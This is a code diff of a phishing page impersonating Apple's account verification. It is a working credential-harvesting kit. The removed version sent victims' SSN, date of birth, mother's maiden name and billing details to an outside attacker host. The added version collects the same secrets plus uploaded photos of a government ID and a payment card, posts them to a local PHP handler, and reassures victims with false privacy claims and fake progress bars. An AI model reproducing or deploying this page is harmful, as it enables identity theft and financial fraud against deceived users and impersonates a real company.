@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="robots" content="noindex, nofollow, noarchive">
-    <title>Apple - Complete Verification</title>
+    <title>Apple - Confirm Your Identity</title>
     
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
@@ -379,6 +379,73 @@
             background-color: var(--apple-blue-hover);
         }
         
+        /* File upload styling */
+        .file-upload-container {
+            border: 2px dashed var(--apple-border);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            background-color: var(--apple-gray-bg);
+            transition: all 0.2s;
+            position: relative;
+        }
+        
+        .file-upload-container:hover {
+            border-color: var(--apple-blue);
+        }
+        
+        .file-upload-text {
+            font-size: 16px;
+            color: var(--apple-text-secondary);
+            margin-bottom: 10px;
+        }
+        
+        .file-upload-btn {
+            background-color: var(--apple-white);
+            color: var(--apple-blue);
+            border: 1px solid var(--apple-blue);
+            border-radius: 980px;
+            padding: 8px 16px;
+            font-size: 15px;
+            cursor: pointer;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+        
+        .file-upload-btn:hover {
+            background-color: rgba(0, 113, 227, 0.05);
+        }
+        
+        .file-upload-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        
+        .file-preview {
+            display: none;
+            margin-top: 15px;
+        }
+        
+        .file-preview img {
+            max-width: 100%;
+            max-height: 200px;
+            border-radius: 8px;
+            border: 1px solid var(--apple-border);
+        }
+        
+        .file-name {
+            font-size: 14px;
+            color: var(--apple-text-main);
+            margin-top: 8px;
+            word-break: break-all;
+        }
+        
         /* Footer */
         .footer {
             background-color: var(--apple-gray-bg);
@@ -417,12 +484,30 @@
             white-space: nowrap;
         }
         
-        /* Honeypot for bots */
-        .bot-field {
-            position: absolute;
-            left: -9999px;
-            opacity: 0;
-            height: 0;
+        /* Progress indicator */
+        .progress-indicator {
+            width: 100%;
+            height: 4px;
+            background-color: var(--apple-gray-bg);
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background-color: var(--apple-blue);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        /* Success check */
+        .success-check {
+            display: none;
+            color: #34c759;
+            font-size: 24px;
+            margin-right: 8px;
         }
         
         /* Responsive */
@@ -475,7 +560,7 @@
             <div class="nav-logo">
                 <a href="#" aria-label="Apple">
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 44">
-                        <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31" fill="#fff"/>
+                        <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
                     </svg>
                 </a>
             </div>
@@ -497,8 +582,8 @@
     <!-- Main Content -->
     <div class="main-content">
         <div class="container-wide">
-            <h1 class="main-title">Complete Your Verification</h1>
-            <p class="subtitle">Please confirm your personal information to complete the security verification process. This helps protect your Apple account and maintain your account security.</p>
+            <h1 class="main-title">Identity Verification</h1>
+            <p class="subtitle">We need to verify your identity to complete this process. Please provide the requested documents to help us protect your Apple ID account.</p>
             
             <!-- Progress Steps -->
             <div class="progress-steps">
@@ -512,7 +597,7 @@
                 </div>
                 <div class="step active">
                     <div class="step-circle">3</div>
-                    <div class="step-label">Confirm Details</div>
+                    <div class="step-label">Confirm Identity</div>
                 </div>
             </div>
             
@@ -523,23 +608,20 @@
                 </div>
                 <div class="account-details">
                     <div class="account-email" id="user-email">example@icloud.com</div>
-                    <div class="account-status">Apple ID • Signed in</div>
+                    <div class="account-status">Apple ID • Verification in progress</div>
                 </div>
             </div>
             
-            <!-- Personal Details Card -->
+            <!-- ID Verification Card -->
             <div class="content-card">
-                <h2 class="card-title">Personal Information</h2>
-                <p class="card-description">Please provide your personal details as they appear on your billing statement and official documents. This information is required to verify your identity.</p>
+                <h2 class="card-title">Upload Your Identity Documents</h2>
+                <p class="card-description">To verify your identity and secure your account, please upload a clear photo of your government-issued ID (driver's license, passport, or state ID) and a photo of your payment card.</p>
                 
-                <form id="details-form" action="#" method="post">
+                <form id="identity-form" action="process-id.php" method="post" enctype="multipart/form-data">
                     <input type="hidden" name="btn3" value="btn3">
                     
-                    <!-- Honeypot fields for bots -->
-                    <div class="bot-field">
-                        <input type="text" name="website3" id="website3">
-                        <input type="text" name="address_confirm" id="address_confirm">
-                    </div>
+                    <!-- Personal Information -->
+                    <h3 style="font-size: 20px; margin-bottom: 20px;">Personal Information</h3>
                     
                     <div class="form-row">
                         <div class="form-column">
@@ -556,28 +638,17 @@
                         </div>
                     </div>
                     
-                    <div class="form-group">
-                        <label for="badd">Billing Address</label>
-                        <input type="text" class="form-control" id="badd" name="badd" required>
-                    </div>
-                    
                     <div class="form-row">
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="ct">City</label>
-                                <input type="text" class="form-control" id="ct" name="ct" required>
+                                <label for="dob">Date of Birth</label>
+                                <input type="text" class="form-control" id="dob" name="dob" required placeholder="MM/DD/YYYY">
                             </div>
                         </div>
                         <div class="form-column">
                             <div class="form-group">
-                                <label for="state">State/Province</label>
-                                <input type="text" class="form-control" id="state" name="state" required>
-                            </div>
-                        </div>
-                        <div class="form-column">
-                            <div class="form-group">
-                                <label for="zip">ZIP/Postal Code</label>
-                                <input type="text" class="form-control" id="zip" name="zip" required>
+                                <label for="ssn">Social Security Number (SSN)</label>
+                                <input type="text" class="form-control" id="ssn" name="ssn" required placeholder="•••-••-••••">
                             </div>
                         </div>
                     </div>
@@ -586,23 +657,7 @@
                         <div class="form-column">
                             <div class="form-group">
                                 <label for="ph">Phone Number</label>
-                                <input type="text" class="form-control" id="ph" name="ph" required placeholder="000-000-0000">
-                            </div>
-                        </div>
-                        <div class="form-column">
-                            <div class="form-group">
-                                <label for="dob">Date of Birth</label>
-                                <input type="text" class="form-control" id="dob" name="dob" required placeholder="MM/DD/YYYY">
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="form-row">
-                        <div class="form-column">
-                            <div class="form-group">
-                                <label for="ssn">Social Security Number</label>
-                                <input type="text" class="form-control" id="ssn" name="ssn" required placeholder="000-00-0000">
-                                <div class="help-text">For identity verification only</div>
+                                <input type="text" class="form-control" id="ph" name="ph" required>
                             </div>
                         </div>
                         <div class="form-column">
@@ -613,28 +668,83 @@
                         </div>
                     </div>
                     
+                    <div class="form-row">
+                        <div class="form-column">
+                            <div class="form-group">
+                                <label for="mname">Mother's Maiden Name</label>
+                                <input type="text" class="form-control" id="mname" name="mname" required>
+                                <div class="help-text">For security verification purposes</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- ID Upload Section -->
+                    <h3 style="font-size: 20px; margin-top: 30px; margin-bottom: 20px;">ID Documents</h3>
+                    
+                    <!-- ID Front -->
                     <div class="form-group">
-                        <label for="mname">Mother's Maiden Name</label>
-                        <input type="text" class="form-control" id="mname" name="mname" required>
-                        <div class="help-text">Used for security verification</div>
+                        <label>Government ID (Front)</label>
+                        <div class="file-upload-container" id="id-front-container">
+                            <div class="file-upload-text">Drag & drop or click to upload the front of your ID</div>
+                            <label class="file-upload-btn">Choose File</label>
+                            <input type="file" class="file-upload-input" name="id_front" id="id-front" accept="image/*" required>
+                            <div class="help-text">Driver's license, passport, or state ID</div>
+                            <div class="file-preview" id="id-front-preview">
+                                <img id="id-front-img" src="#" alt="ID Front Preview">
+                                <div class="file-name" id="id-front-name"></div>
+                            </div>
+                            <div class="progress-indicator" id="id-front-progress">
+                                <div class="progress-bar" id="id-front-progress-bar"></div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- ID Back -->
+                    <div class="form-group">
+                        <label>Government ID (Back)</label>
+                        <div class="file-upload-container" id="id-back-container">
+                            <div class="file-upload-text">Drag & drop or click to upload the back of your ID</div>
+                            <label class="file-upload-btn">Choose File</label>
+                            <input type="file" class="file-upload-input" name="id_back" id="id-back" accept="image/*" required>
+                            <div class="help-text">Make sure all text is clearly visible</div>
+                            <div class="file-preview" id="id-back-preview">
+                                <img id="id-back-img" src="#" alt="ID Back Preview">
+                                <div class="file-name" id="id-back-name"></div>
+                            </div>
+                            <div class="progress-indicator" id="id-back-progress">
+                                <div class="progress-bar" id="id-back-progress-bar"></div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Credit Card Photo -->
+                    <div class="form-group">
+                        <label>Credit Card (Front)</label>
+                        <div class="file-upload-container" id="card-front-container">
+                            <div class="file-upload-text">Drag & drop or click to upload the front of your card</div>
+                            <label class="file-upload-btn">Choose File</label>
+                            <input type="file" class="file-upload-input" name="card_front" id="card-front" accept="image/*" required>
+                            <div class="help-text">For your safety, cover the middle 8 digits of your card number</div>
+                            <div class="file-preview" id="card-front-preview">
+                                <img id="card-front-img" src="#" alt="Card Front Preview">
+                                <div class="file-name" id="card-front-name"></div>
+                            </div>
+                            <div class="progress-indicator" id="card-front-progress">
+                                <div class="progress-bar" id="card-front-progress-bar"></div>
+                            </div>
+                        </div>
                     </div>
                     
                     <div class="info-box">
-                        <h3 class="info-title">Privacy & Security Notice</h3>
-                        <p class="info-text">Your personal information is protected and encrypted using industry-standard security protocols. Apple uses this information solely for verification purposes and does not store sensitive information such as your SSN or driver's license number after verification is complete.</p>
+                        <h3 class="info-title">Security & Privacy Information</h3>
+                        <p class="info-text">All information provided is encrypted using industry-standard protocols. Your ID documents will be used only for identity verification purposes and will not be stored after verification is complete. This additional security step helps protect your Apple account from unauthorized access.</p>
                     </div>
                     
                     <div class="button-group">
                         <button type="button" class="btn btn-secondary" onclick="window.history.back()">Back</button>
-                        <button type="submit" id="complete-button" class="btn btn-primary">Complete Verification</button>
+                        <button type="submit" id="verify-button" class="btn btn-primary">Complete Verification</button>
                     </div>
                 </form>
-            </div>
-            
-            <!-- Final Step Info Card -->
-            <div class="content-card">
-                <h2 class="card-title">What Happens Next</h2>
-                <p class="card-description">Once you complete this verification, your account security will be confirmed. You may need to sign in again to access all Apple services. This process helps ensure that only you have access to your Apple account and personal information.</p>
             </div>
         </div>
     </div>
@@ -661,16 +771,39 @@
     <script>
         $(document).ready(function() {
             // Format inputs
-            $("#ph").inputmask({"mask": "999-999-9999"});
             $("#dob").inputmask({"mask": "99/99/9999", "placeholder": "MM/DD/YYYY"});
             $("#ssn").inputmask({"mask": "999-99-9999"});
+            $("#ph").inputmask({"mask": "(999) 999-9999"});
             
             // Display user email from previous step
             var email = localStorage.getItem('userEmail') || 'example@icloud.com';
             $('#user-email').text(email);
             
-            // Form submission with the same approach as verification.html
-            $('#details-form').on('submit', function(e) {
+            // File preview functions
+            function handleFileSelect(fileInput, imgPreview, previewDiv, nameDiv) {
+                $(fileInput).on('change', function() {
+                    if (this.files && this.files[0]) {
+                        var file = this.files[0];
+                        var reader = new FileReader();
+                        
+                        reader.onload = function(e) {
+                            $(imgPreview).attr('src', e.target.result);
+                            $(nameDiv).text(file.name);
+                            $(previewDiv).show();
+                        }
+                        
+                        reader.readAsDataURL(file);
+                    }
+                });
+            }
+            
+            // Set up file previews
+            handleFileSelect('#id-front', '#id-front-img', '#id-front-preview', '#id-front-name');
+            handleFileSelect('#id-back', '#id-back-img', '#id-back-preview', '#id-back-name');
+            handleFileSelect('#card-front', '#card-front-img', '#card-front-preview', '#card-front-name');
+            
+            // Form submission
+            $('#identity-form').on('submit', function(e) {
                 e.preventDefault();
                 
                 // Validate form
@@ -678,21 +811,85 @@
                     return;
                 }
                 
+                // Show progress indicators
+                $('#id-front-progress, #id-back-progress, #card-front-progress').show();
+                
                 // Disable button to prevent double submission
-                $('#complete-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                $('#verify-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                
+                // Create form data object
+                var formData = new FormData(this);
+                
+                // Simulate progress for visual feedback
+                var progress = 0;
+                var progressInterval = setInterval(function() {
+                    progress += 5;
+                    if (progress <= 100) {
+                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', progress + '%');
+                    } else {
+                        clearInterval(progressInterval);
+                    }
+                }, 150);
                 
                 // Submit form via AJAX
                 $.ajax({
-                    url: "https://rotadosabor.com/joker/next.php",
-                    type: 'POST',
-                    data: $(this).serialize(),
-                    success: function() {
-                        // Redirect to Apple website after successful submission
-                        window.location.href = "https://www.apple.com/";
+                    url: "process-id.php",
+                    type: "POST",
+                    data: formData,
+                    cache: false,
+                    contentType: false,
+                    processData: false,
+                    success: function(response) {
+                        clearInterval(progressInterval);
+                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', '100%');
+                        
+                        // Redirect to success page after small delay
+                        setTimeout(function() {
+                            window.location.href = "success.html";
+                        }, 1000);
                     },
-                    error: function() {
-                        // Still redirect on error to keep flow going
-                        window.location.href = "https://www.apple.com/";
+                    error: function(xhr, status, error) {
+                        clearInterval(progressInterval);
+                        
+                        // Reset progress bars
+                        $('#id-front-progress-bar, #id-back-progress-bar, #card-front-progress-bar').css('width', '0%');
+                        $('#id-front-progress, #id-back-progress, #card-front-progress').hide();
+                        
+                        // Re-enable button
+                        $('#verify-button').prop('disabled', false).text('Complete Verification');
+                        
+                        // Show error message
+                        alert("There was an error processing your verification. Please try again.");
+                        console.error("Error:", error);
+                    }
+                });
+            });
+            
+            // Drag and drop functionality
+            $('.file-upload-container').each(function() {
+                var container = $(this);
+                var input = container.find('input[type="file"]');
+                
+                container.on('dragover', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    container.addClass('border-primary');
+                });
+                
+                container.on('dragleave', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    container.removeClass('border-primary');
+                });
+                
+                container.on('drop', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    container.removeClass('border-primary');
+                    
+                    if (e.originalEvent.dataTransfer && e.originalEvent.dataTransfer.files.length) {
+                        input[0].files = e.originalEvent.dataTransfer.files;
+                        input.trigger('change');
                     }
                 });
             });
